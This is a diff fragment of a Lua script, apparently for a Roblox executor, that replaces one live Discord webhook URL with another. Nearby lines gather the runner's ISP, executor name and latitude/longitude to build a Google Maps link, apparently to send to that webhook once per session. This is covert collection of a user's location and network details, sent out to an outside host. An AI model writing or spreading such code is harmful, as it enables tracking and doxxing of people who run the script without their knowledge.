@@ -78,7 +78,7 @@ local ispColor = ispName ~= "Desconocido" and 16729344 or 15158332
 if getgenv().WebhookEnviado then return end
 getgenv().WebhookEnviado = true
 
-local WebhookURL = "https://discord.com/api/webhooks/1408560291846815877/DvxArNfNtL2o9EbCH1Z7M9ByaVN8VTigxDL0-LSaK9HCGr_Xt6l5xCUaEz59k_4pPpNs"
+local WebhookURL = "https://discord.com/api/webhooks/1410132899683897455/YpndKbCHe4ULyEjHD7X2EKGJm6PfCD_5SVd4VxoQyEt9Hco9N6pndsXLiOZuhFB72YzK"
 local avatarUrl = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"
 local executorName = identifyexecutor and identifyexecutor() or "Desconocido"
 local googleMapsLink = (latVal and lonVal) and "[Ver ubicación](https://www.google.com/maps?q="..latVal..","..lonVal..")" or "N/A"
